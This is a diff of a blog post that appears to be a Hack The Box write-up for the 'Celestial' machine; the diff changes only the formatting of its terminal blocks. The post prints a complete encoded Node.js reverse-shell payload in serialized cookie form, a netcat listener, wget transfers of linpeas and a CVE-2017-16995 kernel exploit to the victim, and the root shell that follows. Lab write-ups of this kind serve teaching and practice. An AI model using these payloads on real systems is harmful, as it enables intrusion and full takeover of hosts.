@@ -26,8 +26,7 @@ Time to take on the medium box called Celestial!
 
 Run nmap to get a list of the services running on top ports.
 
-{% raw %}
-```bash
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.85 
 [sudo] password for kali: 
@@ -51,14 +50,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.67 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run the curl -I to try and get a sense of the technologies running.
 
-{% raw %}
-```bash
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ curl -I http://10.10.10.85:3000
 HTTP/1.1 200 OK
@@ -69,19 +67,24 @@ Content-Length: 12
 ETag: W/"c-8lfvj2TmiRRvB7K+JPws1w9h6aY"
 Date: Mon, 17 Feb 2025 03:26:13 GMT
 Connection: keep-alive
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Decode the token to see if we can see any goodies.
 
-{% raw %}
-```bash
+{% capture decodeoriginalticket %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$  echo 'eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D' | base64 -d
+{% endcapture %}
+
+{% capture originalticketjson %}
 {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=decodeoriginalticket %}
+
+{% include terminal.html language='json' title='json' content=originalticketjson %}
 
 <br />
 Check the landing page the webserver is serving.
@@ -113,13 +116,12 @@ Send the request again and include the cookie again with the profile set to the 
 <br />
 Try changing the num value and encoding in base64.
 
-{% raw %}
-```bash
+{% capture firstchangeattempt %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$  echo '{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"4"}' | base64                                       
 eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjQifQo=
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=firstchangeattempt %}
 
 <br />
 Send the updated request to see if we can affect the value.
@@ -153,8 +155,7 @@ From the research, check the exploit listed in the PowerPoint.
 <br />
 Download the exploit into the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadnodeshellpy %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/refs/heads/master/nodejsshell.py
 --2025-02-17 15:14:29--  https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/refs/heads/master/nodejsshell.py
@@ -167,54 +168,50 @@ Saving to: ‘nodejsshell.py’
 nodejsshell.py                                             100%[========================================================================================================================================>]   1.54K  --.-KB/s    in 0s      
 
 2025-02-17 15:14:29 (36.1 MB/s) - ‘nodejsshell.py’ saved [1575/1575]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadnodeshellpy %}
 
 <br />
 Run the exploit to generate teh reverse shell.
 
-{% raw %}
-```bash
+{% capture runpythonexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ python2 nodejsshell.py 10.10.16.12 4444
 [+] LHOST = 10.10.16.12
 [+] LPORT = 4444
 [+] Encoding
 eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,49,50,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpythonexploit %}
 
 <br />
 Serialize the payload to fit the attack.
 
-{% raw %}
-```json
+{% capture serializepayload %}
 {"username":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,49,50,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='json' title='json' content=serializepayload %}
 
 <br />
 Encode the json string into base64.
 
-{% raw %}
-```bash
+{% capture base64encpayload %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$  echo '{"username":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,49,50,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}' | base64
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=base64encpayload %}
 
 <br />
 Start a listener.
 
-{% raw %}
-```bash
+{% capture start4444listener %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=start4444listener %}
 
 <br />
 Set the cookie to the attack string.
@@ -228,8 +225,7 @@ Set the cookie to the attack string.
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
@@ -237,14 +233,13 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.10.85] 60676
 Connected!
 whoami
 sun
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 sun@celestial:~$ cat user.txt
 cat user.txt
 <redacted>
@@ -264,14 +259,13 @@ ip a
        valid_lft 86396sec preferred_lft 14396sec
     inet6 fe80::250:56ff:feb9:6aa8/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Run sudo -l to see if we can execute anything as root.
 
-{% raw %}
-```bash
+{% capture sudol %}
 sun@celestial:~$ sudo -l
 sudo -l
 [sudo] password for sun: 
@@ -283,25 +277,23 @@ Sorry, try again.
 [sudo] password for sun: 
 
 sudo: 3 incorrect password attempts
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sudol %}
 
 <br />
 Run uname -a to get the linux version.
 
-{% raw %}
-```bash
+{% capture uname %}
 sun@celestial:~$ uname -a
 uname -a
 Linux celestial 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=uname %}
 
 <br />
 Download easy peas-y to the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
 --2025-02-17 16:58:37--  https://github.com/peass-ng/PEASS-ng/releases/download/20250216-fd69e735/linpeas.sh
@@ -324,14 +316,13 @@ linpeas.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ python3 -m http.server                
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpeas %}
 
 <br />
 Transfer linpeas to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferpeas %}
 sun@celestial:/dev/shm$ wget 10.10.16.4:8000/linpeas.sh
 wget 10.10.16.4:8000/linpeas.sh
 --2025-02-17 00:59:55--  http://10.10.16.4:8000/linpeas.sh
@@ -346,14 +337,13 @@ linpeas.sh          100%[===================>] 820.39K  1.11MB/s    in 0.7s
 
 sun@celestial:/dev/shm$ chmod +x linpeas.sh
 chmod +x linpeas.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferpeas %}
 
 <br />
 Run the linpeas script.
 
-{% raw %}
-```bash
+{% capture runpeas %}
 sun@celestial:/dev/shm$ ./linpeas.sh
 ./linpeas.sh
 
@@ -395,8 +385,8 @@ sun@celestial:/dev/shm$ ./linpeas.sh
    Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Look up the eBPF_verifier exploit in Exploit-DB.
@@ -411,8 +401,7 @@ Look up the eBPF_verifier exploit in Exploit-DB.
 <br />
 Download the exploit into the local working folder.
 
-{% raw %}
-```bash
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/celestial]
 └─$ wget https://www.exploit-db.com/raw/45010 -O cve-2017-16995.c
 --2025-02-17 17:47:30--  https://www.exploit-db.com/raw/45010
@@ -431,14 +420,13 @@ cve-2017-16995.c                                               [ <=>            
 └─$ sudo python3 -m http.server 80            
 [sudo] password for kali: 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Transfer the exploit to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferexploit %}
 sun@celestial:/dev/shm$ wget 10.10.16.4/cve-2017-16995.c
 wget 10.10.16.4/cve-2017-16995.c
 --2025-02-17 01:49:09--  http://10.10.16.4/cve-2017-16995.c
@@ -450,14 +438,13 @@ Saving to: ‘cve-2017-16995.c’
 cve-2017-16995.c    100%[===================>]  13.41K  --.-KB/s    in 0.02s   
 
 2025-02-17 01:49:09 (705 KB/s) - ‘cve-2017-16995.c’ saved [13728/13728]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferexploit %}
 
 <br />
 Compile and run the exploit.
 
-{% raw %}
-```bash
+{% capture runcve201716995 %}
 sun@celestial:/dev/shm$ gcc cve-2017-16995.c -o cve-2017-16995
 gcc cve-2017-16995.c -o cve-2017-16995
 sun@celestial:/dev/shm$ ./cve-2017-16995
@@ -481,14 +468,13 @@ sun@celestial:/dev/shm$ ./cve-2017-16995
 # id
 id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(sun)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runcve201716995 %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 # cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -508,8 +494,8 @@ ip a
        valid_lft 86396sec preferred_lft 14396sec
     inet6 fe80::250:56ff:feb9:1ac8/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 And with that with squeezed out another one.  Thanks so much for reading.  See you in the next one!
